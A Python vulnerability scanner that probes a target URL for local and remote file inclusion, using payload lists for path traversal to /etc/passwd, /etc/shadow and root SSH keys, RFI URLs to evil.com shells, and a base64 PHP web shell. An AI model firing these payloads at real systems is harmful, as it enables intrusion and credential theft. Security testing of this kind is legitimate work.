import re
import os
from urllib.parse import urljoin
import requests

class LFIRFIScanner:
    def __init__(self, target, root_access=False):
        self.target = target
        self.root_access = root_access
        self.vulnerabilities = []
        self.lfi_payloads = self._generate_lfi_payloads()
        self.rfi_payloads = self._generate_rfi_payloads()
        
    def _generate_lfi_payloads(self):
        """Generate LFI payloads"""
        base_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "../../etc/shadow",
            "../../etc/hosts",
            "../../../../etc/hosts",
            "../../proc/self/environ",
            "../../proc/version",
            "../../windows/win.ini",
            "../../../../windows/win.ini",
            "..\\..\\..\\windows\\win.ini",
            "../../boot.ini",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "zip://path/to/archive.zip%23file.txt",
            "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
            "expect://ls",
            "input://ls"
        ]
        
        if self.root_access:
            # Add sensitive root files
            sensitive_files = [
                "/root/.bash_history",
                "/root/.ssh/id_rsa",
                "/root/.ssh/authorized_keys",
                "/etc/sudoers",
                "/etc/shadow",
                "/var/log/auth.log",
                "/var/log/syslog",
                "/etc/master.passwd",
                "/etc/security/passwd",
                "/etc/security/opasswd"
            ]
            
            for file in sensitive_files:
                base_payloads.extend([
                    f"../../../{file}",
                    f"../../../../{file}",
                    f"../../../../../{file}"
                ])
                
        return base_payloads
    
    def _generate_rfi_payloads(self):
        """Generate RFI payloads"""
        return [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
            "http://localhost:8080/shell",
            "data:text/plain,<?php system('id'); ?>",
            "expect://whoami",
            "php://input"
        ]
    
    def scan(self):
        """Scan for LFI/RFI vulnerabilities"""
        print(f"[LFI/RFI] Scanning {self.target}...")
        
        # Test for LFI
        self._test_lfi()
        
        # Test for RFI
        self._test_rfi()
        
        # Test null byte injection
        self._test_null_byte()
        
        # Test wrappers
        self._test_wrappers()
        
        return {
            "target": self.target,
            "vulnerabilities": self.vulnerabilities,
            "count": len(self.vulnerabilities),
            "risk_level": "CRITICAL" if self.vulnerabilities else "LOW"
        }
    
    def _test_lfi(self):
        """Test Local File Inclusion"""
        test_params = ['file', 'page', 'load', 'path', 'doc', 'document']
        
        for param in test_params:
            for payload in self.lfi_payloads[:20]:
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                    # Check for indicators
                    indicators = ['root:', 'daemon:', 'bin/', '/bin/bash', 'DocumentRoot']
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            self.vulnerabilities.append({
                                'type': 'LFI',
                                'param': param,
                                'payload': payload,
                                'evidence': indicator,
                                'url': test_url
                            })
                            break
                            
                except Exception:
                    continue
    
    def _test_rfi(self):
        """Test Remote File Inclusion"""
        # This would involve setting up a test server
        # Simplified version for demonstration
        pass
    
    def _test_null_byte(self):
        """Test null byte injection"""
        null_payloads = [
            "../../etc/passwd%00",
            "../../etc/passwd%00.jpg",
            "../../etc/passwd\x00",
            "../../etc/passwd\0"
        ]
        
        for payload in null_payloads:
            try:
                test_url = f"{self.target}?file={payload}"
                response = requests.get(test_url, timeout=5)
                
                if 'root:' in response.text:
                    self.vulnerabilities.append({
                        'type': 'LFI with Null Byte',
                        'payload': payload,
                        'url': test_url
                    })
                    
            except Exception:
                continue
    
    def _test_wrappers(self):
        """Test PHP wrappers"""
        wrappers = [
            "php://filter/convert.base64-encode/resource=index.php",
            "zip:///path/to/file.zip%23shell.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://ls",
            "phar:///path/to/file.phar/shell.php"
        ]
        
        for wrapper in wrappers:
            try:
                test_url = f"{self.target}?file={wrapper}"
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 0:
                    self.vulnerabilities.append({
                        'type': 'Wrapper Injection',
                        'wrapper': wrapper.split('://')[0],
                        'url': test_url
                    })
                    
            except Exception:
                continue